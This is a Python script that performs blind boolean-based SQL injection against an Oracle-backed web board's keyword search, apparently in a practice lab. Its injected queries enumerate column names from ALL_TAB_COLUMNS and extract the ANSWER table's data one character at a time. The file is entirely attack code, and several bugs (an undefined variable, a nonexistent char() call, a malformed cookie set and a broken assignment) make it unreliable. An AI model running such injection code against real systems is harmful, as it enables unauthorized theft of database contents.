import requests

URL='http://elms1.skinfosec.co.kr:8082/community6/free' #test할 URL
data={'startDt':'','endDt':'','searchType':'all','keyword':''}

headers={'ContentType':'/application/x-www-form-urlencoded'}
cookies={'JSESSIONID','~~~~'}

def binarySearch(query):
    min=1
    max=127
    avg=0
    while(min<=max):
        avg=(min+max)//2
        data['keyword']=query.format(str(avg))
        #print(data['keyword'])
        response = requests.post(URL, headers=headers,cookies=cookies, data=data)
        if "결과가 없습니다." in response.text:
            #print('거짓')
            max= avg-1
        else:
            #print('참')
            min= avg+1
    return min

#------------------------------------------------------------
#칼럼 개수

query = "test%' and(SELECT COUNT(COLUMN_NAME) FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='ANSWER')>{} and '1%'='1"

print("ANSWER 칼럼 개수" + str(binarySearch(query)))
print('\n')
columnCount = binarySearch(query)

#------------------------------------------------------------
#각 칼럼 문자열 길이
#각 칼럼명 확인
#------------------------------------------------------------

for k in range(1,columnCount+1):
    query1 = f"test%' and (LENGTH((SELECT COLUMN_NAME FROM (SELECT ROWNUM RNUM, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME= 'ANSWER') WHERE RNUM = {k}))) > {{}} and '1%'='1"
    
    binarySearch(query1)
    
    print(f"ANSWER {k}번째 칼럼의 문자열 길이: "+str(binarySearch(query1)))
    columnLength = binarySearch(query1)
    print('\n')
    
    query2=f"test%' and ASCII(SUBSTR((SELECT COLUMN_NAME FROM(SELECT ROWNUM RNUM, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='ANSWER')WHERE RNUM = {K}),{{}},1))>{{}} and '1%'='1"
    
    columnname = ' '
    for i in range(1,columnLength+1):
        min=1
        max=127
        avg=0
        while(min<=max):
            avg = (min+max)//2
            data['keyword'] =query2.format(str(i),str(avg))
            #print(data['keyword'])
            response=requests.post(URL,headers=headers,cookies=cookies,data=data)
            if'결과가 없습니다.' in response.text:
                #print('거짓')
                max=avg-1
            else:
                #print('참')
                min=avg+1
            print(f"{k}번째 칼럼의"+str(i)+"번째 글자 : "+chr(min))
            columnname +=char(min)
            
        print(f"{k}번쨰 칼럼명 : "+columnname)
        print('\n')
#------------------------------------------------------------
#데이터 개수
query3="test%' and (SELECT COUNT(ANSWER) FROM ANSWER) > {} and '1%'='1"

binarySearch(query3)
print("데이터 개수 : "+str(binarySearch(query3)))

#------------------------------------------------------------
#데이터 문자열 길이
query4="test' and (LENGTH((SELECT ANSWER FROM (SELECT ROWNUM RNUM, ANSWER FROM ANSWER) WHERE RNUM = 1)))> {} and '1%'='1"

binarySearch(query4)
print("데이터 문자열 길이 : "+str(binarySearch(query4)))

dataLength=binarySearch(query4)
#------------------------------------------------------------
#데이터 구하기
query5 ="test%' and (ASCII(substr((SELECT ANSWER FROM(SELECT ROWNUM RNUM, ANSWER FROM ANSWER)WHERE RNUM=1),{},1))>{}) and '1%'='1"

dataname=''
for i in range(1,dataLength+1):
    min=1
    max=127
    avg=0
    while(min<max):
        avg(min+max)//2
        data['keyword']=query5.format(str(i),str(avg))
        #print(data['keyword'])
        response=requests.post(URL,headers=headers,cookies=cookies,data=data)
        if'결과가 없습니다.' in response.text:
            #print('거짓')
            max=avg-1
        else:
            #print('참')
            min=avg+1
    print("데이터의"+str(i)+"번쨰 글자 : "+chr(min))
    dataname +=chr(min)
print('\n')
print("데이터 : "+dataname)
